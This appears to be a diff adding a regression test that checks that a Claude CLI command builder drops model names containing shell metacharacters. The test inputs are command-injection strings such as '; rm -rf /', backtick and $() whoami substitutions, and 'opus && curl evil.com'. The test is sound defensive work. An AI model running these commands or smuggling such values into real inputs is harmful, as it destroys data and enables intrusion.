@@ -73,6 +73,27 @@ describe('ClaudeProvider', () => {
       });
       expect(cmd).toBe('claude --dangerously-skip-permissions --model haiku');
     });
+
+    // Regression coverage for issue #116: options.model is untrusted (reachable
+    // over the remote WS bridge with only a token as gate) and is written
+    // straight into a PTY as `claude ... --model <value>`. A metacharacter in
+    // that value would let an attacker execute arbitrary shell commands.
+    // session-manager.ts is the primary gate, but buildCommand() must never
+    // trust its caller either.
+    it.each([
+      '; rm -rf /',
+      'opus`whoami`',
+      'opus$(whoami)',
+      'opus && curl evil.com',
+      'opus | tee /tmp/x',
+      'opus\nrm -rf /',
+      'opus with spaces',
+    ])('drops a metacharacter-laden model (%j) instead of appending it to the command', (maliciousModel) => {
+      const cmd = provider.buildCommand({ ...baseOptions, model: maliciousModel });
+      expect(cmd).toBe('claude');
+      expect(cmd).not.toContain(maliciousModel);
+      expect(cmd).not.toMatch(/[;`$|&\n]/);
+    });
   });
 
   describe('getReadinessPatterns()', () => {
